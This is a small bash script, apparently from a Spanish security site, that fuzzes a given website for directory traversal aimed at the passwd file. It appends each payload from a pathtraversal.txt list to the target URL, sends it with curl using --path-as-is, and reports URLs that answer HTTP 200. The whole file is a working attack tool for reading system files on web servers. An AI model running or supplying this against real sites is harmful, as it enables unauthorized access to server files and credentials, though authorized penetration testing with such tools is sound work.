#!/bin/bash
cat << "INFO"
   __                                      _   _       _                                      _ 
  / _|                                    | | | |     | |                                    | |
 | |_ _   _ ___________ _ __   _ __   __ _| |_| |__   | |_ _ __ __ ___   _____ _ __ ___  __ _| |
 |  _| | | |_  /_  / _ \ '__| | '_ \ / _` | __| '_ \  | __| '__/ _` \ \ / / _ \ '__/ __|/ _` | |
 | | | |_| |/ / / /  __/ |    | |_) | (_| | |_| | | | | |_| | | (_| |\ V /  __/ |  \__ \ (_| | |
 |_|  \__,_/___/___\___|_|    | .__/ \__,_|\__|_| |_|  \__|_|  \__,_| \_/ \___|_|  |___/\__,_|_|
                              | |                                                               
                              |_|    http://www.hackingyseguridad.com                              

INFO
if [ -z "$1" ]; then
        echo
        echo "Directorio traversal sobre fichero passwd en url de sitio web por HTTP/1.1 200 OK.. "
        echo "Uso: $0 <http://dominio.com>"
        exit 0
fi
echo
echo "Fuzzer de: " $1
echo

for n in `cat pathtraversal.txt`

do
        fqdn=$1$n
        if curl $fqdn --path-as-is -I --silent|grep "200"
        then echo $fqdn
        fi
done
